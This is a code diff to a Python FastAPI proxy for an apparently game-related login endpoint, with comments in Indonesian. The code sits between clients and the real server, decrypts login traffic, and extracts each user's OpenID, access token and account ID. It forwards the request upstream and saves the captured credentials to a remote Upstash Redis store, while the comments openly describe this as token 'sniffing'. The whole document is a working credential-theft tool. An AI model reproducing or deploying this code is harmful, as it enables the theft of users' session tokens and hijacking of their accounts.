@@ -89,7 +89,7 @@ def make_octet_response(text: str, status_code: int = 400) -> Response:
     )
 
 
-# Handler khusus MajorLogin (Sniffing Token + Forward)
+# Handler khusus MajorLogin (Sniffing Request & Response Token + Forward)
 @app.post("/MajorLogin")
 @app.post("/majorlogin")
 @app.post("/api/MajorLogin")
@@ -99,39 +99,38 @@ async def handle_major_login(request: Request):
     if not body:
         return make_octet_response("Request body is empty\n", status_code=400)
 
-    # 1. Dekripsi & simpan ke Upstash Redis
+    open_id = None
+    access_token = None
+
+    # 1. Dekripsi & Ekstrak OpenID & Access Token dari Request
     try:
         try:
-            ciphertext = bytes.fromhex(body.decode("utf-8", errors="ignore").strip())
+            req_ciphertext = bytes.fromhex(body.decode("utf-8", errors="ignore").strip())
         except Exception:
-            ciphertext = body
+            req_ciphertext = body
 
-        if len(ciphertext) > 0 and len(ciphertext) % 16 == 0:
-            decrypted = aes_decrypt(ciphertext)
-            decoded, _ = blackboxprotobuf.protobuf_to_json(decrypted)
+        if len(req_ciphertext) > 0 and len(req_ciphertext) % 16 == 0:
+            req_decrypted = aes_decrypt(req_ciphertext)
+            req_decoded, _ = blackboxprotobuf.protobuf_to_json(req_decrypted)
+        else:
+            req_decoded, _ = blackboxprotobuf.protobuf_to_json(body)
 
-            if isinstance(decoded, str):
-                fields = json.loads(decoded)
-            elif isinstance(decoded, dict):
-                fields = decoded
-            else:
-                fields = {}
+        if isinstance(req_decoded, str):
+            req_fields = json.loads(req_decoded)
+        elif isinstance(req_decoded, dict):
+            req_fields = req_decoded
+        else:
+            req_fields = {}
 
-            open_id_val = fields.get("22")
-            access_token_val = fields.get("29")
+        if "22" in req_fields:
+            open_id = str(req_fields["22"])
+        if "29" in req_fields:
+            access_token = str(req_fields["29"])
 
-            if open_id_val and access_token_val:
-                open_id = str(open_id_val)
-                access_token = str(access_token_val)
-
-                await redis_client.set(
-                    f"session:{open_id}", access_token, ex=86400
-                )
-                print(f"[Redis] Saved OpenID: {open_id}")
     except Exception as e:
-        print(f"[Warn] Failed to parse/save token to Upstash: {e}")
+        print(f"[Warn] Gagal parse request body: {e}")
 
-    # 2. Forward request original
+    # 2. Forward request original ke upstream target
     headers = dict(request.headers)
     headers.pop("host", None)
     headers.pop("content-length", None)
@@ -143,11 +142,64 @@ async def handle_major_login(request: Request):
                 content=body,
                 headers=headers,
             )
+
+            res_content = target_res.content
+            account_id = None
+
+            # 3. Dekripsi & Ekstrak Account ID dari Respon Server
+            try:
+                try:
+                    res_ciphertext = bytes.fromhex(res_content.decode("utf-8", errors="ignore").strip())
+                except Exception:
+                    res_ciphertext = res_content
+
+                # Coba dekripsi AES jika data berukuran kelipatan block size 16
+                if len(res_ciphertext) > 0 and len(res_ciphertext) % 16 == 0:
+                    try:
+                        res_decrypted = aes_decrypt(res_ciphertext)
+                        res_decoded, _ = blackboxprotobuf.protobuf_to_json(res_decrypted)
+                    except Exception:
+                        res_decoded, _ = blackboxprotobuf.protobuf_to_json(res_content)
+                else:
+                    res_decoded, _ = blackboxprotobuf.protobuf_to_json(res_content)
+
+                if isinstance(res_decoded, str):
+                    res_fields = json.loads(res_decoded)
+                elif isinstance(res_decoded, dict):
+                    res_fields = res_decoded
+                else:
+                    res_fields = {}
+
+                # Field 1 = account_id (UInt64)
+                if "1" in res_fields:
+                    account_id = str(res_fields["1"])
+
+            except Exception as e:
+                print(f"[Warn] Gagal parse response account_id: {e}")
+
+            # 4. Simpan paket data lengkap ke Upstash Redis
+            if open_id or account_id:
+                session_key = f"session:{account_id or open_id}"
+                session_payload = {
+                    "open_id": open_id,
+                    "access_token": access_token,
+                    "account_id": account_id,
+                }
+                
+                await redis_client.set(
+                    session_key,
+                    json.dumps(session_payload),
+                    ex=86400,
+                )
+                print(f"[Redis] Berhasil simpan session -> {session_payload}")
+
+            # 5. Kembalikan respons asli server ke client
             return Response(
                 content=target_res.content,
                 status_code=target_res.status_code,
                 headers=dict(target_res.headers),
             )
+
         except Exception as e:
             return make_octet_response(
                 f"Error: [FFFFFF]{str(e)}\n",
